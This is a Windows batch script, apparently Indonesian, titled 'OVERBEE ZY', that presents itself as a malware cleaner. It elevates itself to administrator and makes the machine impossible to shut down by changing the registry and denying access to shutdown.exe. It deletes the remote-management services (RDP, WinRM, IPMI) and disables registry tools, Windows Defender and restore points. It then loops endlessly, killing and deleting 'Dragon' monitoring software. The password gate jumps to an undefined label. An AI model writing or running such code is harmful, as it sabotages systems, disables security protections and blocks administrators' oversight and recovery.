@echo off
title OVERBEE ZY - LOCKED
color 0C

:LOCK
cls
echo ========================================
echo OVERBEE ZY - PERLU KUNCI AKSES
echo ========================================
echo.
set /p pass=MASUKKAN KUNCI:

if "%pass%"=="Ikky111@" goto START
echo.
echo KUNCI SALAH! AKSES DITOLAK
timeout /t 2 >nul
exit

echo. 
title PELINDUNG SISTEM - TIDAK BISA DIMATIKAN
mode con cols=60 lines=15
color 0C

:: ==============================================
:: OTOMATIS MINTA HAK ADMINISTRATOR
:: ==============================================
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    echo Meminta hak akses penuh...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

cls
echo.
echo 🔐  SEDANG MENGUNCI SISTEM SECARA PERMANEN...
echo ==============================================
echo.

:: ==============================================
:: KUNCI SISTEM: TIDAK BISA DIMATIKAN
:: ==============================================
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Windows" /v NoShutdown /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul

:: KUNCI FILE PERINTAH MATIKAN AGAR TIDAK BISA DIPAKAI
takeown /f %windir%\system32\shutdown.exe /a >nul
icacls %windir%\system32\shutdown.exe /deny *S-1-1-0:F /inheritance:r >nul
attrib +R +S +H %windir%\system32\shutdown.exe

takeown /f %windir%\system32\restart.exe /a >nul 2>&1
icacls %windir%\system32\restart.exe /deny *S-1-1-0:F /inheritance:r >nul 2>&1
attrib +R +S +H %windir%\system32\restart.exe >nul 2>&1

:: BLOKIR SEMUA JALUR KENDALI JARAK JAUH & BIOS/IPMI
reg add "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v DisableWin32Shutdown /t REG_DWORD /d 1 /f >nul
sc config TermService start= disabled >nul
sc stop TermService >nul
sc delete TermService >nul
sc config WinRM start= disabled >nul
sc stop WinRM >nul
sc delete WinRM >nul
sc config RemoteRegistry start= disabled >nul
sc stop RemoteRegistry >nul
sc config ipmi start= disabled >nul
sc stop ipmi >nul
sc delete ipmi >nul

:: NONAKTIFKAN DEFENDER & PEMULIHAN OTOMATIS
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableRestorePoint /t REG_DWORD /d 1 /f >nul

cls
echo.
echo ✅ SISTEM TELAH DIKUNCI TOTAL
echo ❌ SERVER TIDAK BISA MEMATIKAN ATAU MENGUBAH APA PUN
echo 🔥 PENGAWASAN DIMULAI...
echo.
echo Tekan Ctrl+C hanya jika ingin menghentikan pemantauan saja
echo ==========================================================

:: ==============================================
:: LOOP TANPA HENTI: BUNUH SEMUA PROSES PENGAWAS
:: ==============================================
:ULANG
echo ========================================
echo OVERBEE ZY - HAPUS TOTAL DRAGON + MALWARE
echo ========================================
echo.

echo [1] MATIIN SEMUA PROSES...
taskkill /f /im DL_2IMG69ZKLH.exe >nul 2>&1
taskkill /f /im nxprun.exe >nul 2>&1
taskkill /f /im MountGameDrive.exe >nul 2>&1
taskkill /f /im PrcsessDlbpd.exe >nul 2>&1
taskkill /f /im DragonLauncher.exe >nul 2>&1
taskkill /f /im DragonDaemon.exe >nul 2>&1
taskkill /f /im DragonServer.exe >nul 2>&1
taskkill /f /im StreamManag*.exe >nul 2>&1
taskkill /f /im SaveManager_Client.exe >nul 2>&1
taskkill /f /im ServerMonitor.exe >nul 2>&1
taskkill /f /im AccountAssistantDa*.exe >nul 2>&1
echo Semua proses dimatikan

echo.
echo [2] HAPUS FOLDER DRAGON/UUDU...
rd /s /q "C:\Program Files\Dragon" >nul 2>&1
rd /s /q "C:\Program Files (x86)\Dragon" >nul 2>&1
rd /s /q "C:\ProgramData\Dragon" >nul 2>&1
rd /s /q "%appdata%\Dragon" >nul 2>&1
rd /s /q "%localappdata%\Dragon" >nul 2>&1
echo Folder Dragon dihapus

echo.
echo [3] HAPUS FILE MALWARE...
del /f /q "C:\*DL_2IMG69ZKLH.exe" >nul 2>&1
del /f /q "%userprofile%\*DL_2IMG69ZKLH.exe" >nul 2>&1
del /f /q "%appdata%\*DL_2IMG69ZKLH.exe" >nul 2>&1
del /f /q "%temp%\*DL_2IMG*" >nul 2>&1
del /f /q "%temp%\*nxprun*" >nul 2>&1
del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\*nxprun*" >nul 2>&1
echo File malware dihapus

:: JAGA KUNCI TETAP AKTIF
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Windows" /v NoShutdown /t REG_DWORD /d 1 /f >nul

ping -n 1 127.0.0.1 -w 150 >nul
goto ULANG
